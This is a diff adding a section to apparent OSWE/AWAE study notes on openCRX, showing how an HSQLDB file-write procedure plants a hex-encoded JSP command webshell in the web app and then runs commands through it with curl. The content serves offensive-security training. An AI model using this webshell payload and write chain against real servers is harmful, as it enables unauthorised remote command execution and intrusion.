@@ -333,3 +333,23 @@ Check PoC:
 @opencrx:~/crx/data/hsqldb$ cat test.txt 
 It worked!student@opencrx:~/crx/data/hsqldb$
 ```
+### Writing Webshell
+Now that we know where to write our files, we can use our `writeBytesToFilename` procedure to write a JSP command shell. If everything works, we should be able to access it from our browser.
+**Webshell:** https://github.com/m0hammad-yaser/OSWE-AWAE-Notes/blob/main/openCRX/cmdjsp.jsp
+
+We will use the `Decoder` tool in BurpSuite again to convert the contents of our JSP webshell into ASCII hex. Once we have the converted value, we can call `writeBytesToFilename` and use a relative path to the `opencrx-core-CRX` directory with our shell filename.
+```sql
+call writeBytesToFilename('../../apache-tomee-plus-7.0.5/apps/opencrx-core-CRX/shell.jsp', cast ('3c2540207061676520696d706f72743d226a6176612e696f2e2a2220253e0a3c250a202020537472696e6720636d64203d20726571756573742e676574506172616d657465722822636d6422293b0a202020537472696e67206f7574707574203d2022223b0a0a202020696628636d6420213d206e756c6c29207b0a202020202020537472696e672073203d206e756c6c3b0a202020202020747279207b0a20202020202020202050726f636573732070203d2052756e74696d652e67657452756e74696d6528292e6578656328636d64293b0a2020202020202020204275666665726564526561646572207349203d206e6577204275666665726564526561646572286e657720496e70757453747265616d52656164657228702e676574496e70757453747265616d282929293b0a2020202020202020207768696c65282873203d2073492e726561644c696e6528292920213d206e756c6c29207b0a2020202020202020202020206f7574707574202b3d20733b0a2020202020202020207d0a2020202020207d0a202020202020636174636828494f457863657074696f6e206529207b0a202020202020202020652e7072696e74537461636b547261636528293b0a2020202020207d0a2020207d0a253e0a0a3c7072653e0a3c253d6f757470757420253e0a3c2f7072653e' AS VARBINARY(1024)))
+```
+Finally, if we call our JSP and pass `"hostname"` as the `cmd` value in the query string, we should receive the results of the command as shown in the listing below.
+```bash
+┌──(kali㉿kali)-[/usr/share/webshells/jsp]
+└─$ curl http://opencrx:8080/opencrx-core-CRX/shell.jsp?cmd=hostname
+
+<pre>
+opencrx
+</pre>                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[/usr/share/webshells/jsp]
+└─$
+```
+Now that we can execute commands on the server with our command shell, we can work towards a full interactive shell on the server.
